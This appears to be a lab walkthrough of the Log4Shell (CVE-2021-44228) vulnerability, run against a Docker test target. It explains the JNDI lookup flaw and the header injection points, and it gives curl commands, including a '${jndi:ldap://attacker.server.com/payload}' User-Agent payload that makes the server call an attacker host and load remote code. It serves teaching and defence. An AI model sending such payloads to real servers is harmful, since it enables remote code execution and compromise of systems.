# Log4J / CVE-2021-44228
    Versions: All versions from 2.0-beta9 to 2.16


CVE-2021-44228 or Log4Shell is a vulnerability found in the Java library with the maximum criticality score of CVSS 10/10. The library named Log4j got this rating because besides being very popular, it grants access to Remote Code Execution (RCE).

It is still used by many companies of all types and sizes and even after months of its discovery being made public, a lot of hosts still haven't updated their software. Here in this article, I present a way to run the exploit so that you can understand the vulnerability and prevent it from being exploited on your system and also explain a little about your application.

This vulnerability creates an active connection to LDAP, loading a Java Class or Jar that would be a malicious file directly into memory, causing the execution context to be ready. With Java already being interpreted as binary, it would already be executed and with that, accessing the memory. And accessing the memory, grants us access to databases, files... anything we want to do.

Your first targets are usually data entry points like username and password logins, http headers like User-Agent, X-Forwarded-For and others. Basically anywhere the user can provide data.

To perform this exploit, I used a vulnerable and easy-to-apply LAB with Log4J available in this [GIT](https://github.com/leonjza/log4jpwn).

![docker](https://user-images.githubusercontent.com/66689576/160430502-abc2c99e-7a65-48d5-913d-f165442ef757.png)

With docker running on port 8080, we can start to identify if the server is vulnerable to log4shell or not.
It may be interesting to check the version of Log4J, if there is a log where you can insert some information that the application does not consider as a string, as well as an endpoint with some protocol such as HTTP for example, which may allow sending a malicious string.

At first, I will use **curl** to send a request to the server, requesting the java version from the User-Agent.

    curl -v -H 'User-Agent: ${java:version}' '172.17.0.1:8080/'

Making the server run it: 

![ua](https://user-images.githubusercontent.com/66689576/160430578-9caa5e17-129b-4bc3-a7fd-1e574ac4fc2e.png)

## Execution

Now we can get a little better look at what's to come. If in our request, we use the **JNDI** (Java Naming and Directory Interface) protocol, it becomes possible to execute some malicious payload inside the server, thus triggering the log4j vulnerability, which, after execution, makes the server returns us a Java classpath, which was injected earlier.

This injected payload when triggered, gives the attacker access to execute arbitrary code. 

	curl -v -H 'User-Agent: ${jndi:ldap://attacker.server.com/payload}' '172.17.0.1:8080/'
	
JNDI is an independent API that gives access to directory services, bringing objects or data to the client side through information (name). Its two basic functions are to associate a name with a resource and to find a resource by its name. 

When we make a request to the User-Agent, sending what would be the payload, through Curl to the server, we are acting within the network itself, being safer to detect the vulnerability.

![curlTrue](https://user-images.githubusercontent.com/66689576/162072699-82285f21-70d6-4668-b94c-96a1ab4eb771.png)

Here we can see that a connection was established with my machine, when the server (docker) executed the payload I sent to it, thus releasing the opportunity for an RCE.

![nc22222](https://user-images.githubusercontent.com/66689576/162073080-26e07482-377c-43d7-afd7-b8009d32631e.png)

Server-side view running the payload:

![logLog](https://user-images.githubusercontent.com/66689576/162073340-6db1bf73-975d-47b7-97d7-011c7c7c76c8.png)

## References

**Mitre**
>https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228

**Curl**
>https://curl.se/docs/manpage.html

**Docker LAB**
>https://github.com/leonjza/log4jpwn

**Luna Sec**
>https://www.lunasec.io/docs/blog/log4j-zero-day/

That's it :)
